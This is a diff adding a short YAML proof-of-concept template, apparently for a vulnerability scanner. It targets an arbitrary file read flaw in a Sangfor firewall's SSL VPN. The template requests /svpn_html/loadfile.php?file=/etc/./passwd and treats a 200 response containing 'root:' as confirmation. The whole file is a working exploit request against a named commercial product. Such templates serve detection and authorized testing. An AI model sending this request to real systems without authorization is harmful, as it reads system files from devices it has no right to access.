@@ -1,0 +1,9 @@
+name: poc-yaml-深信服-防火墙-Diretory
+description: "任意文件读取"
+method: GET
+path:
+  - /svpn_html/loadfile.php?file=/etc/./passwd
+expression:
+  status: 200
+  body_all:
+    - "root:"
